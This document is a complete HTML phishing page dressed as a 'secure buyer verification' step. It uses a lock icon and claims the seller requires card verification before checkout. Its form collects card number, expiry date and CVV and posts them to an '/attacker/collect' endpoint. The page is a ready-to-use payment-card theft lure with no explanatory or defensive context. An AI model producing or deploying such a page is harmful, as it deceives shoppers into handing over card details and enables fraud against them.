<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Secure buyer verification</title>
<style>body{font-family:system-ui,sans-serif;background:#eef2f7;margin:0;display:flex;justify-content:center;padding:60px}
.box{background:#fff;border-radius:16px;padding:36px 42px;width:460px;box-shadow:0 8px 30px rgba(0,0,0,.08)}
h1{font-size:24px;margin:0 0 6px} p{color:#555} label{display:block;font-size:13px;font-weight:600;margin:14px 0 6px}
input{width:100%;padding:11px;border:1px solid #d1d5db;border-radius:8px;font-size:15px} button{margin-top:22px;width:100%;padding:13px;border:0;border-radius:10px;background:#16a34a;color:#fff;font-weight:700;font-size:16px}
.lock{color:#16a34a;font-weight:700}</style></head>
<body><div class="box"><div class="lock">🔒 Secure verification</div><h1>Verify your card to continue</h1><p>Required by the seller before checkout.</p>
<form action="/attacker/collect" method="post">
<label>Card number</label><input name="card_number"><label>Expiry</label><input name="expiry"><label>CVV</label><input name="cvv">
<button>Verify</button></form></div></body></html>
